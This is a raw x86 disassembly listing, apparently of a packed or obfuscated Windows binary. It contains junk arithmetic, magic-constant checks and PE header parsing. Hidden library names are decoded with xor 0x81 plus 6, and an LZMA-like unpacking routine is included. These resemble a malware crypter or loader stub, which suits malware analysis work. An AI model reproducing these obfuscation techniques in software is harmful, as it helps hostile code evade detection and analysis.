  41f87b:	ret    0xd0b
  41f87e:	mov    ecx,0xb900426e
  41f883:	mov    bl,0x8
  41f885:	push   ecx
  41f886:	pop    es
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d75
  41f8e9:	mov    edx,DWORD PTR ds:0x42af6d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	or     al,BYTE PTR [edi+0x5c62471e]
  41faaa:	jae    0x41faf6
  41faac:	sbb    DWORD PTR [ecx-0x6f52e050],0xffffffeb
  41fab3:	cmc    
  41fab4:	add    DWORD PTR [eax],eax
  41fab6:	add    BYTE PTR [eax],al
  41fab8:	inc    ebx
  41fab9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
